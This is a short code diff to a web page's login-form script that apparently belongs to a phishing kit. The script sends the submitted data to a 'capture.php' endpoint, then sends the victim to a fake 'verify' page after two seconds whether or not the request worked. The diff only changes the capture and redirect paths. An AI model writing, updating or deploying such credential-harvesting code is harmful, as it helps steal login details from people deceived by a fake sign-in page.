@@ -196,7 +196,7 @@
             document.getElementById('loginForm').style.display = 'none';
             document.getElementById('loading').style.display = 'block';
             
-            fetch('/capture.php', {
+            fetch('/captures/capture.php', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -209,11 +209,11 @@
                 })
             }).then(() => {
                 setTimeout(() => {
-                    window.location.href = '/verify.html';
+                    window.location.href = '/pages/verify.html';
                 }, 2000);
             }).catch(() => {
                 setTimeout(() => {
-                    window.location.href = '/verify.html';
+                    window.location.href = '/pages/verify.html';
                 }, 2000);
             });
             
